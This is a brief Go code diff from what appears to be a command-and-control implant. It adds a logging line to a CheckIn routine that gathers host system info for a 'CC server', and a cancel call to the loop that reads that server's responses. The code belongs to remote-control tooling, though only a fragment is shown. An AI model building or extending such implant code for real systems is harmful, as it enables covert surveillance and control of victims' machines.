@@ -26,6 +26,7 @@ import (
 // CheckIn poll CC server and report its system info
 func CheckIn() error {
 	info := CollectSystemInfo()
+	log.Println("Collected system info")
 
 	sysinfoJSON, err := json.Marshal(info)
 	if err != nil {
@@ -138,6 +139,7 @@ func CCMsgTun(ctx context.Context, cancel context.CancelFunc) (err error) {
 	// check for CC server's response
 	go func() {
 		log.Println("Check CC response: started")
+		defer cancel()
 		for ctx.Err() == nil {
 			// read response
 			err = in.Decode(&msg)
